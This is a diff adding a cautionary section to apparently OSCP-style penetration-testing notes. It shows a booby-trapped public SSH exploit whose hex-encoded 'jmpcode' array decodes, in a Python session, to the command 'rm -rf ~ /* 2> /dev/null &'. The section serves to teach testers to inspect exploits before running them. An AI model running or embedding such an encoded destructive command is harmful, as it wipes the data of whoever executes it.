@@ -2230,3 +2230,32 @@ whoami
 hr137\hsmith
 ```
 
+## Locating Public Exploits
+- A Word of Caution 
+Malicious SSH exploit asking for root privileges on the attacking machine
+```
+if (geteuid()) {
+  puts("Root is required for raw sockets, etc."); return 1;
+}
+```
+對 payload 檢查發現了一個 jmpcode 陣列
+```c
+[...]
+char jmpcode[] =
+"\x72\x6D\x20\x2D\x72\x66\x20\x7e\x20\x2F\x2A\x20\x32\x3e\x20\x2f"
+"\x64\x65\x76\x2f\x6e\x75\x6c\x6c\x20\x26";
+[...]
+```
+> 已被編碼的十六進位字元
+```
+┌──(chw㉿CHW-kali)-[~]
+└─$ python3
+
+>>> jmpcode = [
+... "\x72\x6D\x20\x2D\x72\x66\x20\x7e\x20\x2F\x2A\x20\x32\x3e\x20\x2f"
+... "\x64\x65\x76\x2f\x6e\x75\x6c\x6c\x20\x26"]
+>>> print(jmpcode)
+['rm -rf ~ /* 2> /dev/null &']
+>>>
+```
+> Malicious SSH exploit payload that will wipe your attacking machine
